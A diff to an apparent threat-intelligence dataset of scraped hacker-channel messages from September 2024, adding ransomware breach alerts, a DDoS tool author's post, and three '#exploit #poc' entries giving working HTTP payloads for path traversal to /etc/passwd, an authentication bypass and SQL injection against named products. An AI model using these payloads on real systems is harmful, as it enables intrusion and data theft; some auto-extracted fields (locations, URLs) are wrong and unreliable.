@@ -2509,6 +2509,17 @@
                 "tps://tdga.dga.or.th/\nI",
                 "9.15.110.136\nI"
             ]
+        },
+        {
+            "Message ID": 5015,
+            "Date": "2024-09-03",
+            "Content": "Many people ask why we do not released a new update of MegaMedusa while the tools successfully created and still were not published?\n\nThe reason :\n- The people recode our tool.\n- The people sell our tool.\n- The people condemn and criticize our tool while it's just a free tool.\n- The people do not respect our tool\n- Our tools are not welcome in Github and don't get any like in Github while thousands of people use it.\n\nNB: Indonesians sell, recode and condemn MegaMedusa",
+            "Attack Type": "Unknown",
+            "Location": [
+                "Github",
+                "Github"
+            ],
+            "URLs": []
         }
     ],
     "لواء محمد ﷺ": [
@@ -3892,6 +3903,38 @@
                 "N/A"
             ],
             "URLs": []
+        },
+        {
+            "Message ID": 1905,
+            "Date": "2024-09-03",
+            "Content": "蜂信物联 FastBee 开源物联网平台 download 任意文件\n\nGET /prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd HTTP/1.1\n\n#exploit #poc",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 1904,
+            "Date": "2024-09-03",
+            "Content": "智联云采 SRM2.0 autologin 身份认证绕过\n\nGET /adpweb/static/..;/api/sys/app/autologin?loginName=admin HTTP/1.1\n\n#exploit #poc",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 1903,
+            "Date": "2024-09-03",
+            "Content": "紫光电子档案管理系统 selectFileRemote SQL\n\nPOST /Archive/ErecordManage/selectFileRemote HTTP/1.1\nHost: \nAccept: */* Accept-Encoding: gzip, deflate\nConnection: close\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\n \nuserID=admin&fondsid=1&comid=' and updatexml(1,concat(0x7e,user(),0x7e),1)=1\n\n#exploit #poc #SQL",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": [
+                "112.0.0.0"
+            ]
         }
     ],
     "Anonymous Chat": [
@@ -7281,6 +7324,46 @@
             "Attack Type": "Unknown",
             "Location": [
                 "N/A"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 653,
+            "Date": "2024-09-03",
+            "Content": "⚠️Cyberattack Alert - 🇺🇸Project Hospitality\n\nThe hacking group Rhysida claims to have breached Project Hospitality, a nonprofit offering services to the homeless and vulnerable, particularly those with HIV, substance use, or mental illness\n\nThe sample provided by the cybercriminal group shows that passports, driving licenses, SSNs, tax forms, and other documents were exfiltrated.\n\nRansom demand: 15 BTC (approx. $880,000).\nRansom deadline: 09th Sep 24.",
+            "Attack Type": "Hacking",
+            "Location": [
+                "Rhysida"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 652,
+            "Date": "2024-09-03",
+            "Content": "⚠️Cyberattack Alert - 🇬🇧Removal​.ai\n\nThe hacking group RansomHub claims to have breached Removal​.ai, an AI image background removal.\n\nAllegedly, 12 GB of data were exfiltrated, including a database containing clients' payment information, IP addresses, full personal details, email addresses, API tokens, passwords, and all other associated data, compromising over 14 million users and 70 million database lines. \n\nRansom deadline: 07th Sep 24.",
+            "Attack Type": "Hacking",
+            "Location": [
+                "GB"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 651,
+            "Date": "2024-09-03",
+            "Content": "⚠️Cyberattack Alert - 🇱🇺Amber Beverage Group\n\nThe hacking group RansomHub claims to have breached Amber Beverage Group, a leading producer, distributor, logistics provider and retailer of spirits.\n\nAllegedly, 1.7 TB of data were exfiltrated.\nRansom deadline: 10th Sep 24.",
+            "Attack Type": "Hacking",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 650,
+            "Date": "2024-09-03",
+            "Content": "⚠️Cyberattack Alert - 🇯🇵Sanyo Bussan Co.\n\nThe hacking group RansomHub claims to have breached Sanyo Bussan Co. \n\nAllegedly, 12 GB of data were exfiltrated.\nRansom deadline: 10th Sep 24.",
+            "Attack Type": "Hacking",
+            "Location": [
+                "GB"
             ],
             "URLs": []
         }
@@ -13299,6 +13382,16 @@
             "Message ID": 4309,
             "Date": "2024-04-20",
             "Content": "April 20, 2024  New Attacker Group  #Intel",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 4416,
+            "Date": "2024-09-03",
+            "Content": "September 3, 2024  ZeroSevenGroup Offers Access to Israeli Energy Organization on Dark Web  #Intel",
             "Attack Type": "Unknown",
             "Location": [
                 "N/A"
